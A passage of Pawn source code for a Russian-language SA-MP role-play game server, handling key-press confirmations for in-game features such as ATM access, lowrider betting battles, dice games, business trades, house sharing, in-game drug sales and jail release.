	    if(GetPlayerState(playerid) == 1 && !GetPVarInt(playerid,"CheckProv") && !GetPVarInt(playerid,"CheckProvAdm"))
	    {
	        for(new i = 0;i < sizeof(Bankomats); i++)
	        {
	            if(!IsPlayerInRangeOfPoint(playerid, 2.0, Bankomats[i][0],Bankomats[i][1], Bankomats[i][2])) continue;
	            if(!PlayerInfo[playerid][pBankPin])
				{
			        SendClientMessage(playerid,CGREY,"Вы зарегистрировали карту! Создать карту можно в отделении банка.");
					return SendClientMessage(playerid,CGREY,"Используйте: /gps » Основное » Банк");
				}
				else ShowPlayerDialog(playerid,373,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
				break;
	        }
	        for(new i = 1;i <= TOTALBANK; i++)
	        {
	            if(!IsPlayerInRangeOfPoint(playerid, 2.0, BankInfo[i][bX], BankInfo[i][bY], BankInfo[i][bZ])) continue;
                if(!PlayerInfo[playerid][pBankPin])
				{
			        SendClientMessage(playerid,CGREY,"Вы зарегистрировали карту! Создать карту можно в отделении банка.");
					return SendClientMessage(playerid,CGREY,"Используйте: /gps » Основное » Банк");
				}
				else ShowPlayerDialog(playerid,373,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
				break;
	        }
	    }
	}
	if(PRESSED(KEY_JUMP | KEY_SPRINT) && !IsPlayerInAnyVehicle(playerid) && GetPVarInt(playerid,"AntiSbiv") == 0) ApplyAnimation(playerid,"FAT","IDLE_tired",4.1,0,0,0,0,0,1);//ClearAnimations(playerid);
	if(newkeys & KEY_YES)
	{
	    if(GetPVarInt(playerid,"LowRideID") > 0)
	    {
    		new playerd = GetPVarInt(playerid,"LowRideID")-1,stavka = GetPVarInt(playerid,"LowRideStavka");
    		
			if(!IsPlayerInRangeOfPoint(playerid, 10.0, 1067.2545,1758.1206,10.8203))
			{
			    SendClientMessage(playerd,CGREY,"Вы не рядом с парковкой для LowRide Battle");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с парковкой для LowRide Battle");
			}
			if(GetPlayerState(playerid) != 2)
			{
			    SendClientMessage(playerd,CGREY,"Игрок не за рулем транспорта");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid,CGREY,"Вы не за рулем транспорта");
			}
			if(!GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS))
			{
			    SendClientMessage(playerd,CGREY,"У игрока нет гидравлики на трапспорте");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid,CGREY,"У Вас нет гидравлики на трапспорте");
			}
		 	new kek = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(playerid) != VInfo[v][vcar]) continue;
				if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
				break;
			}
			if(kek == 0)
			{
			    SendClientMessage(playerd,CGREY,"Это не транспортное средство игрока");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
			}
			if(!IsLowRide(GetPlayerVehicleID(playerid)))
			{
		 		SendClientMessage(playerd,CGREY,"Транспорт игрока не предназначен для LowRide Battle");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid,CGREY,"Ваш транспорт не предназначен для LowRide Battle");
			}
			if(PlayerInfo[playerid][pCash] < stavka)
			{
			    SendClientMessage(playerd, CGREY, "У игрока недостаточно средств");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid, CGREY, "Недостаточно средств");
			}
			new Float:x,Float:y,Float:z;
		    GetPlayerPos(playerd,x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, x,y,z))
			{
		        SendClientMessage(playerd,CGREY,"Вы не рядом с игроком");
		        DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
		 	if(GetPlayerState(playerd) != 2)
			{
			    SendClientMessage(playerid,CGREY,"Игрок не за рулем транспорта");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerd,CGREY,"Вы не за рулем транспорта");
			}
			if(!GetVehicleComponentInSlot(GetPlayerVehicleID(playerd), CARMODTYPE_HYDRAULICS))
			{
			    SendClientMessage(playerid,CGREY,"У игрока нет гидравлики на трапспорте");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerd,CGREY,"У Вас нет гидравлики на трапспорте");
			}
		   	new kek1 = 0;
			for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(playerd) != VInfo[v][vcar]) continue;
				if(strcmp(VInfo[v][vname], PlayerInfo[playerd][pSendername], true) == 0) kek1 = v;
				break;
			}
			if(kek1 == 0)
			{
			    SendClientMessage(playerid,CGREY,"Это не транспортное средство игрока");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerd,CGREY,"Это не ваше транспортное средство");
			}
			if(!IsLowRide(GetPlayerVehicleID(playerd)))
			{
		 		SendClientMessage(playerid,CGREY,"Транспорт игрока не предназначен для LowRide Battle");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerd,CGREY,"Ваш транспорт не предназначен для LowRide Battle");
			}
			if(PlayerInfo[playerd][pCash] < stavka)
			{
			    SendClientMessage(playerid, CGREY, "У игрока недостаточно средств");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerd, CGREY, "Недостаточно средств");
			}
			new zone = -1;
			for(new i = 0; i < 10; i++)
            {
                if(ZoneBattle[i][btimebattle]) continue;
                zone = i;
                break;
            }
            if(zone == -1)
            {
			    SendClientMessage(playerid, CGREY, "Все зоны для баттла заняты, ожидайте");
			    DeletePVar(playerid,"LowRideID");
			    DeletePVar(playerid,"LowRideStavka");
				return SendClientMessage(playerd, CGREY, "Все зоны для баттла заняты, ожидайте");
            }
            ZoneBattle[zone][bstavka] = stavka;
            ZoneBattle[zone][bplayer1] = playerid;
            ZoneBattle[zone][bplayer2] = playerd;
            SetPVarInt(playerid,"InLowRide",zone+1);
            SetPVarInt(playerd,"InLowRide",zone+1);
            GiveMoney(playerid,-stavka);
            GiveMoney(playerd,-stavka);
            new carid = GetPlayerVehicleID(playerid),carid2 = GetPlayerVehicleID(playerd);
            SetVehiclePos(carid,1072.0320,1757.7162,10.5946);
			SetVehicleZAngle(carid,91.1331);
			SetVehiclePos(carid2,1061.9208,1757.6045,10.6202);
			SetVehicleZAngle(carid2,269.7508);
            StartLowRide(playerid,playerd);
            StartLowRide(playerd,playerid);
            
			ZoneBattle[zone][btimebattle] = 90;
            
	    }
	    if(GetPVarInt(playerid,"Zvarova") > 0)
	    {
	        new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"Zvarova"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 2.0, x,y,z))
			{
			    DeletePVar(playerid,"Zvarova");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			new Float:angle;
			GetPlayerFacingAngle(GetPVarInt(playerid,"Zvarova"), angle);
			SetPlayerFacingAngle(playerid, angle + 180);
			ApplyAnimation(GetPVarInt(playerid,"Zvarova"), "GANGS", "hndshkfa",4.0,0,0,0,0,0,1);
			ApplyAnimation(playerid, "GANGS", "hndshkfa",4.0,0,0,0,0,0,1);
			static const fmt_string[] = "%s пожал руку %s";
			new str[sizeof(fmt_string)+24+24];
			format(str, sizeof(str), fmt_string,PlayerInfo[GetPVarInt(playerid,"Zvarova")][pSendername],PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "пожал руку", COLOR_PURPLE, 30.0, 7000);
			SetPlayerChatBubble(GetPVarInt(playerid,"Zvarova"), "пожал руку", COLOR_PURPLE, 30.0, 7000);
			DeletePVar(playerid,"Zvarova");
	    }
		if(GetPVarInt(playerid,"Sem") > 0)
		{
		    new Float:x,Float:y,Float:z;
			GetPlayerPos(GetPVarInt(playerid,"SemID"),x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z))
			{
			    SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"Sem");
				DeletePVar(playerid,"SemID");
		        return true;
			}
			PlayerInfo[playerid][pFam] = PlayerInfo[GetPVarInt(playerid,"SemID")][pFam];
			SetPlayerInt(PlayerInfo[playerid][pSendername],"fam",PlayerInfo[playerid][pFam]);
		    static const fmt_string[] = "[%s] Приветствуем нового члена семьи %s";
			new str[sizeof(fmt_string)+32+50];
			format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[GetPVarInt(playerid,"SemID")][pFam]][fName],PlayerInfo[playerid][pSendername]);
			SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
			DeletePVar(playerid,"Sem");
			DeletePVar(playerid,"SemID");
		}
	    if(GetPVarInt(playerid,"Dice") > 0)
	    {
	        new Float:x,Float:y,Float:z;
    		GetPlayerPos(GetPVarInt(playerid,"DiceID"),x,y,z);
    		if(!IsPlayerInRangeOfPoint(playerid,50.0,1962.19714, 1010.02173, 992.96722))
    		{
    			SendClientMessage(playerid,CGREY,"Вы не в казино");
				DeletePVar(playerid,"Dice");
				DeletePVar(playerid,"DiceID");
				DeletePVar(playerid,"DiceCena");
		        return true;
    		}
  			if(!IsPlayerConnected(GetPVarInt(playerid,"DiceID")) || PlayerLogged[GetPVarInt(playerid,"DiceID")] == false || !IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
		    {
		        SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
				DeletePVar(playerid,"Dice");
				DeletePVar(playerid,"DiceID");
				DeletePVar(playerid,"DiceCena");
		        return true;
		    }
		    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"DiceCena"))
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно средств");
		        SendClientMessage(GetPVarInt(playerid,"DiceID"),CGREY,"У игрока недостаточно средств");
				DeletePVar(playerid,"Dice");
				DeletePVar(playerid,"DiceID");
				DeletePVar(playerid,"DiceCena");
		        return true;
		    }
			GiveMoney(playerid,-GetPVarInt(playerid,"DiceCena"));
			GiveMoney(GetPVarInt(playerid,"DiceID"),-GetPVarInt(playerid,"DiceCena"));
			new rand1 = random(9), rand2 = random(9);
			if(rand2 > rand1) GiveMoney(playerid,GetPVarInt(playerid,"DiceCena")*2);
			else if(rand2 < rand1) GiveMoney(GetPVarInt(playerid,"DiceID"),GetPVarInt(playerid,"DiceCena")*2);
			else
			{
			    GiveMoney(playerid,GetPVarInt(playerid,"DiceCena"));
			    GiveMoney(GetPVarInt(playerid,"DiceID"),GetPVarInt(playerid,"DiceCena"));
			}
			static const fmt_string[] = "%s и %s бросили кости. Результат: %i:%i";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[GetPVarInt(playerid,"DiceID")][pSendername],PlayerInfo[playerid][pSendername],rand1,rand2);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "бросил кости", COLOR_PURPLE, 30.0, 7000);
			SetPlayerChatBubble(GetPVarInt(playerid,"DiceID"), "бросил кости", COLOR_PURPLE, 30.0, 7000);
			DeletePVar(playerid,"Dice");
			DeletePVar(playerid,"DiceID");
			DeletePVar(playerid,"DiceCena");
			    
	    }
	    if(GetPVarInt(playerid,"Pod"))
		{
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"PodID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, x,y,z))
			{
			    SendClientMessage(playerid,GetPVarInt(playerid,"PodID"),"Игрок не рядом с Вами");
			    DeletePVar(playerid,"PodID");
			    DeletePVar(playerid,"PodSlot");
			    DeletePVar(playerid,"Pod");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			new i = PlayerInfo[GetPVarInt(playerid,"PodID")][pGrabTeam];
			if(PlayerInfo[playerid][pGrabTeam])
			{
			    if(BankGrab[i][bLeader] == PlayerInfo[playerid][pID]) ClearBand(PlayerInfo[playerid][pGrabTeam]);
			    else
			    {
				    for(new d = 0; d < 3; d++)
				    {
						if(BankGrab[i][bPlayer][d] != PlayerInfo[playerid][pID])
						BankGrab[i][bPlayer][d] = -1;
						break;
				    }
			    }
			}
			PlayerInfo[playerid][pGrabTeam] = i;
			PlayerInfo[playerid][pGrabQuest] = 0;
			BankGrab[i][bPlayer][GetPVarInt(playerid,"PodSlot")] = PlayerInfo[playerid][pID];
			new player = GetPVarInt(playerid,"PodID");
			BankGrab[playerid][bLeader] = BankGrab[player][bLeader];
		 	BankGrab[playerid][bPlayer][0] = BankGrab[player][bPlayer][0];
		 	BankGrab[playerid][bPlayer][1] = BankGrab[player][bPlayer][1];
		 	BankGrab[playerid][bPlayer][2] = BankGrab[player][bPlayer][2];
		 	BankGrab[playerid][bQuest][0] = BankGrab[player][bQuest][0];
		 	BankGrab[playerid][bQuest][1] = BankGrab[player][bQuest][1];
		 	BankGrab[playerid][bQuest][2] = BankGrab[player][bQuest][2];
		 	BankGrab[playerid][bQuest][3] = BankGrab[player][bQuest][3];
		 	BankGrab[playerid][bQuest][4] = BankGrab[player][bQuest][4];
		 	BankGrab[playerid][bTown] = BankGrab[player][bTown];
		 	BankGrab[playerid][bTimes] = BankGrab[player][bTimes];
			SendClientMessage(playerid,CREWARD,"Вы согласились участвовать в ограблении!");
			SendClientMessage(GetPVarInt(playerid,"PodID"),CREWARD,"Игрок согласился участвовать в ограблении!");
			DeletePVar(playerid,"PodID");
			DeletePVar(playerid,"PodSlot");
			DeletePVar(playerid,"Pod");

		}
	    if(GetPVarInt(playerid,"Upr") > 0)
	    {
	        new Float:x,Float:y,Float:z;
    		GetPlayerPos(GetPVarInt(playerid,"UprID"),x,y,z);
  			if(!IsPlayerConnected(GetPVarInt(playerid,"UprID")) || PlayerLogged[GetPVarInt(playerid,"UprID")] == false || !IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
		    {
		        SendClientMessage(playerid,CGREY,"Игрок не рядом с вами");
				DeletePVar(playerid,"Upr");
				DeletePVar(playerid,"UprID");
		        return true;
		    }
			if(GetPlayerUpr(playerid))
			{
                strmid(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen], "None", 0, strlen("None"), 32);
                query = "";
                format(query, sizeof(query), "UPDATE `biz` SET `menedger` = 'None' WHERE id = '%d' LIMIT 1",GetPVarInt(playerid,"PlayerBiz"));
				mysql_tquery(mysql,query);
			}
			SendClientMessage(playerid,CREWARD,"Вы согласились стать управляющим бизнеса");
			SendClientMessage(GetPVarInt(playerid,"UprID"),CREWARD,"Игрок согласился стать управляющим бизнеса");
			SetPVarInt(playerid,"PlayerBiz",GetPVarInt(GetPVarInt(playerid,"UprID"),"PlayerBiz"));
			strmid(BizInfo[GetPVarInt(GetPVarInt(playerid,"UprID"),"PlayerBiz")][bMen], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
            query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `menedger` = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername],GetPVarInt(GetPVarInt(playerid,"UprID"),"PlayerBiz"));
			mysql_tquery(mysql,query);
			DeletePVar(playerid,"Upr");
			DeletePVar(playerid,"UprID");
	    }
	    if(GetPVarInt(playerid,"CbizCena1") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(GetPVarInt(playerid,"CbizID1"),x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"CbizID1"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"CbizCena1");
				DeletePVar(playerid,"CbizID1");
				return true;
			}
			if(!GetPlayerBiz(GetPVarInt(playerid,"CbizID1")))
			{
		 		SendClientMessage(playerid,CGREY,"Игрок не владеет бизнесом!");
		 		SendClientMessage(GetPVarInt(playerid,"CbizID1"),CGREY,"Вы не владеете бизнесом!");
				DeletePVar(playerid,"CbizCena1");
				DeletePVar(playerid,"CbizID1");
				return true;
		 	}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"CbizCena1"))
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
	 			SendClientMessage(GetPVarInt(playerid,"CbizID1"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"CbizCena1");
				DeletePVar(playerid,"CbizID1");
				return true;
			}
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите купить бизнес?\nВы получите:{f7ae11}\n%s{FFFFFF}\nОтдадите:\n{f7ae11}$%i";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,BizInfo[GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz")][bName],GetPVarInt(playerid,"CbizCena1"));
			ShowPlayerDialog(playerid,146,DIALOG_STYLE_MSGBOX,"Покупка бизнес",str2,"Да","Нет");
	    }
 		if(GetPVarInt(playerid,"CbizCena") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(GetPVarInt(playerid,"CbizID"),x,y,z);
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"CBizID"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"CBizCena");
				DeletePVar(playerid,"CbizID");
				return true;
			}
			if(!GetPlayerBiz(GetPVarInt(playerid,"CbizID")))
			{
		 		SendClientMessage(playerid,CGREY,"Игрок не владеет бизнесом!");
		 		SendClientMessage(GetPVarInt(playerid,"CbizID"),CGREY,"Вы не владеете бизнесом!");
				DeletePVar(playerid,"CbizCena");
				DeletePVar(playerid,"CbizID");
				return true;
		 	}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"CbizCena"))
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
	 			SendClientMessage(GetPVarInt(playerid,"CbizID"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"CbizCena");
				DeletePVar(playerid,"CbizID");
				return true;
			}
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите обменять свой бизнес?\nВы получите:{f7ae11}\n%s{FFFFFF}\nОтдадите:\n{f7ae11}$%i\n%s";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,BizInfo[GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz")][bName],GetPVarInt(playerid,"CbizCena"),BizInfo[GetPVarInt(playerid,"PlayerBiz")][bName]);
			ShowPlayerDialog(playerid,144,DIALOG_STYLE_MSGBOX,"Обмен бизнес",str2,"Да","Нет");
	    }
	    if(GetPVarInt(playerid,"Podsel") > 0)
	    {
			if(GetPlayerZasel(playerid))
			{
				switch(GetPVarInt(playerid,"PlayerZasel"))
				{
					case 1: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel1","None");
					case 2: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel2","None");
					case 3: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel3","None");
					case 4: strmid( HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", 0, strlen("None"), 32), SetHouseStr(GetPVarInt(playerid,"PlayerHouse"),"Zasel4","None");
				}
				DeletePVar(playerid,"PlayerHouse");
				DeletePVar(playerid,"PlayerZasel");
				
			}
			if(GetPlayerHouse(playerid) || GetPlayerKom(playerid))
			{
				SendClientMessage(GetPVarInt(playerid,"PodselID"),CGREY,"У Игрока есть жильё");
				SendClientMessage(playerid,CGREY,"У Вас есть жильё");
				DeletePVar(playerid,"Podsel");
				DeletePVar(playerid,"PodselID");
			}
			switch(GetPVarInt(playerid,"Zasel"))
			{
				case 1:
				{
					strmid(HInfo[GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse")][hZasel1], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
					SetHouseStr(GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse"),"hZasel1",PlayerInfo[playerid][pSendername]);
				}
				case 2:
				{
					strmid(HInfo[GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse")][hZasel2], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
					SetHouseStr(GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse"),"hZasel2",PlayerInfo[playerid][pSendername]);
				}
				case 3:
				{
					strmid(HInfo[GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse")][hZasel3], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
					SetHouseStr(GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse"),"hZasel3",PlayerInfo[playerid][pSendername]);
				}
				case 4:
				{
					strmid(HInfo[GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse")][hZasel4], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
					SetHouseStr(GetPVarInt(GetPVarInt(playerid,"PodselID"),"PlayerHouse"),"hZasel4",PlayerInfo[playerid][pSendername]);
				}
			}
			SendClientMessage(GetPVarInt(playerid,"PodselID"),CREWARD,"Игрок подселился к вам");
			SendClientMessage(playerid,CREWARD,"Вас подселились в дом");
			DeletePVar(playerid,"Podsel");
			DeletePVar(playerid,"PodselID");
	    }
		if(GetPVarInt(playerid,"SellDrugsCena2") > 0)
	    {
	        if(PlayerInfo[GetPVarInt(playerid,"SellDrugsID2")][pDrugs] < GetPVarInt(playerid,"SellDrugs2"))
			{
				SendClientMessage(playerid,CGREY,"У Игрока нет такого кол-ва наркотиков");
				SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),CGREY,"У Вас нет такого кол-ва наркотиков");
				DeletePVar(playerid,"SellDrugsID2");
				DeletePVar(playerid,"SellDrugsCena2");
				DeletePVar(playerid,"SellDrugs2");
				return true;
			}
	        if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"SellDrugsCena2"))
			{
				SendClientMessage(playerid,CGREY,"У Игрока нет такого кол-ва денег");
				SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),CGREY,"У Вас нет такого кол-ва денег");
				DeletePVar(playerid,"SellDrugsID2");
				DeletePVar(playerid,"SellDrugsCena2");
				DeletePVar(playerid,"SellDrugs2");
				return true;
			}
		/*	if(!PlayerInfo[playerid][pUl][2])
			{
				if(PlayerInfo[playerid][pDrugs]  + GetPVarInt(playerid,"SellDrugs2") > 500)
				{
					SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),CGREY,"У Игрока недостаточно места");
					SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 500 наркотиков");
					DeletePVar(playerid,"SellDrugsID2");
					DeletePVar(playerid,"SellDrugsCena2");
					DeletePVar(playerid,"SellDrugs2");
					return true;
				}
			}
			else
			{
			    if(PlayerInfo[playerid][pDrugs]  + GetPVarInt(playerid,"SellDrugs2") > 1000)
				{
					SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),CGREY,"У Игрока недостаточно места");
					SendClientMessage(playerid,CGREY,"Вы не можете с собой носить больше 1000 наркотиков");
					DeletePVar(playerid,"SellDrugsID2");
					DeletePVar(playerid,"SellDrugsCena2");
					DeletePVar(playerid,"SellDrugs2");
					return true;
				}
			}*/
			if(GetFree(playerid,337,GetPVarInt(playerid,"SellDrugs2")))
			{
				SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),CGREY,"У Игрока недостаточно места");
				SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре");
				DeletePVar(playerid,"SellDrugsID2");
				DeletePVar(playerid,"SellDrugsCena2");
				DeletePVar(playerid,"SellDrugs2");
				return true;
			}
			InvMinus(playerid,337,GetPVarInt(playerid,"SellDrugs2"));
			GiveInv(playerid,337,GetPVarInt(playerid,"SellDrugs2"));
			PlayerInfo[GetPVarInt(playerid,"SellDrugsID2")][pDrugs] -= GetPVarInt(playerid,"SellDrugs2");
			PlayerInfo[playerid][pDrugs] += GetPVarInt(playerid,"SellDrugs2");
			GiveMoney(playerid,-GetPVarInt(playerid,"SellDrugsCena2"));
			GiveMoney(GetPVarInt(playerid,"SellDrugsID2"),GetPVarInt(playerid,"SellDrugsCena2"));
			SendClientMessage(playerid,CREWARD,"Вы купили наркотики");
			SendClientMessage(GetPVarInt(playerid,"SellDrugsID2"),CREWARD,"Игрок купил у Вас наркотики");
			DeletePVar(playerid,"SellDrugsID2");
			DeletePVar(playerid,"SellDrugsCena2");
			DeletePVar(playerid,"SellDrugs2");
	    }
	    if(GetPVarInt(playerid,"Adv") > 0)
	    {
	        if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"AdvCena"))
	        {
	            SendClientMessage(playerid,CGREY,"Недостаточно средств");
	            SendClientMessage(GetPVarInt(playerid,"AdvID"),CGREY,"У Игрока недостаточно средств");
	            DeletePVar(playerid,"Adv");
	            DeletePVar(playerid,"AdvCena");
	            DeletePVar(playerid,"AdvID");
	            DeletePVar(playerid,"AdvStat");
	            return true;
	        }
	        GiveMoney(playerid,-GetPVarInt(playerid,"AdvCena"));
	        
	        new bab = GetPVarInt(playerid,"AdvCena")*10/100;
			PlayerInfo[GetPVarInt(playerid,"AdvID")][pPayDay] += bab;
			static const fmt_string2[] = "Игрок вышел из тюрьмы. К Вашей запрплате прибавлено $%i";
			new str2[sizeof(fmt_string2)+5];
			format(str2, sizeof(str2), fmt_string2,bab);
	  		SendClientMessage(GetPVarInt(playerid,"AdvID"),CREWARD,str2);
	        new text[20];
	        GetPVarString(playerid, "AdvStat", text, sizeof(text));
			static const fmt_string[] = "[R] %s выпустил %s из тюрьмы | Статья: %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+20];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[GetPVarInt(playerid,"AdvID")][pSendername],text);
			SendFMes(F_MAYOR,COLOR_SKLAD,str);
			SetPlayerPos(playerid,294.1084,1412.5465,10.0101);
			SetPlayerFacingAngle(playerid,263.5977);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			if(!PlayerInfo[GetPVarInt(playerid,"AdvID")][pQuestS][19])
			{
				PlayerQuest[GetPVarInt(playerid,"AdvID")][19][0]++;
				CheckQuest(GetPVarInt(playerid,"AdvID"),19);
			}
			SendClientMessage(playerid,CREWARD,"Вас освободили из тюрьмы. Если вы попадете в тюрьму в течение 24 часов, вы проведете там в два раза больше!");
			PlayerInfo[playerid][pJailTime] = 0; PlayerInfo[playerid][pJail] = 0;
			PlayerInfo[playerid][pFreeTime] = gettime()+86400;
			DeletePVar(playerid,"Adv");
			DeletePVar(playerid,"AdvCena");
			DeletePVar(playerid,"AdvID");
			DeletePVar(playerid,"AdvStat");
	    }
	    if(GetPVarInt(playerid,"Sex") > 0)
	    {
			new Float:x,Float:y,Float:z;
			GetPlayerPos(playerid,x,y,z);
			if(!IsPlayerInRangeOfPoint(GetPVarInt(playerid,"SexID"), 7.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				SendClientMessage(GetPVarInt(playerid,"SexID"),CGREY,"Вы не рядом с игроком");
				DeletePVar(playerid,"Sex");
				DeletePVar(playerid,"SexID");
				return true;
			}
			if(PlayerInfo[playerid][pCash] < 5000)
			{
				SendClientMessage(playerid,CGREY,"Недостаточно средств");
				SendClientMessage(GetPVarInt(playerid,"SexID"),CGREY,"У Игрока недостаточно средств");
				DeletePVar(playerid,"Sex");
				DeletePVar(playerid,"SexID");
				return true;
			}
			new text[20];
			switch(PlayerInfo[playerid][pSex])
			{
			    case 1: PlayerInfo[playerid][pSex] = 2, text = "женский";
			    case 2: PlayerInfo[playerid][pSex] = 1, text = "мужской";
			}
			GiveMoney(playerid,-3000);
 			static const fmt_string[] = "Вы сменили пол. Теперь ваш пол %s";
			new str[sizeof(fmt_string)+20];
			format(str, sizeof(str), fmt_string,text);
			SendClientMessage(playerid,CREWARD,str);
			SendClientMessage(GetPVarInt(playerid,"SexID"),CREWARD,"Игрок сменил пол, деньги прибавлены к вашей зарплате");
			PlayerInfo[GetPVarInt(playerid,"SexID")][pPayDay] += 100;
			DeletePVar(playerid,"Sex");
